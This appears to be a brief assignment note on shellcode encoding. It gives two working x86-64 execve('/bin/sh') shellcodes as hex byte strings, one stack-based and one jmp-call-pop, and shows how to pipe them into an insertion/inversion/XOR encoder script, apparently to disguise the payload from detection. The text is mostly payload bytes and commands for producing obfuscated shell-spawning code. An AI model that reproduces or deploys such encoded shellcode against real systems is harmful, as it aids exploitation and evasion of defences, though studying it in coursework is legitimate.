For this assignment I use execve_stack shellcode (auto generated) :

if you want encode for example another shellcode (execve_jcp for this example) 

place the comment symbol appropriately 


python code ------

#shellcode = bytearray(sys.stdin.read())

shellcode  = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
python code ------



Command:

#echo -ne "\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43" | ./Insertion_Inversion_XorEncoder.py 